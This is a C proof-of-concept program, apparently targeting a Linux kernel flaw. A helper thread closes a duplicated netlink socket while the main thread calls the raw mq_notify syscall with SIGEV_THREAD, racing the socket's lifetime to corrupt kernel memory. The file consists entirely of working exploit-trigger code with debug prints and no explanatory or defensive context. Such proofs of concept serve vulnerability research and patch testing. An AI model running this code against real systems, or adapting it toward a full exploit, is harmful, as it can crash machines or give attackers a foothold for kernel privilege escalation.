//gcc poc.c -lpthread -o poc

#include <mqueue.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <errno.h>


#define SOL_NETLINK (270)
#define NOTIFY_COOKIE_LEN (32)
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(fd,  level,  optname, optval, optlen) syscall(__NR_setsockopt, fd,  level,  optname, optval, optlen)
#define _dup(fd) syscall(__NR_dup,fd)
#define _close(fd) syscall(__NR_close,fd)

struct unblock_thread_arg {
    int fd;
    int unblock_fd;
    bool ok;
    // bool block;
};

int optval = 666;
void *unblock_thread(struct unblock_thread_arg *arg)
{
    struct unblock_thread_arg *iner_arg = arg;
    int fd = iner_arg->unblock_fd;
    int optname = NETLINK_NO_ENOBUFS;
    int optlen = sizeof(int);
    printf("close sock_fd\n");
    printf("close sock_fd succeed\n");
    printf("[unblock thread]\tfd:%d\tstate:%d\n",fd,(int)iner_arg->ok);
    arg->ok = true;
    printf("start to unblock\n");
    printf("%d\t%d\t%d\t%d\t%d\n",fd,  SOL_NETLINK,  optname, optval, optlen);
    sleep(5);


    if(_setsockopt(fd,  SOL_NETLINK,  optname, &optval, sizeof(int)))
        perror("setsockopt error");
    _close(iner_arg->fd);
    return NULL;
}


int main()
{

    int sock_fd;
    struct unblock_thread_arg arg;
    pthread_t tid;

    char user_buf[128];
    struct sigevent sigv;
    memset(&sigv,0,sizeof(sigv));

    if ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC))<0)
    {
        perror("socket");
        return -1;
    }
    memset(&arg,0,sizeof(arg));
    printf("%d\n",sock_fd);
    arg.fd = sock_fd;
    arg.ok = false;
    printf("start to dup\n");
    if((arg.unblock_fd=_dup(sock_fd))<0)
    {
        perror("dup");
        return -2;
    }
    printf("dup succeed\n");
    if(errno = pthread_create(&tid,NULL,unblock_thread,&arg))
    {
        perror("unblock thread create error");
        return -1;
    }
    printf("unblock thread created succeed\n");
    while(arg.ok == false);
    puts("\nxxxx");
    printf("[main thread]\tfd:%d\tstate:%d\n",arg.fd,(int)arg.ok);

    sigv.sigev_signo = sock_fd;
    sigv.sigev_notify = SIGEV_THREAD;
    sigv.sigev_value.sival_ptr = user_buf;
    _mq_notify((mqd_t)0x666,&sigv);

    // close(sock_fd);
    return 0;
}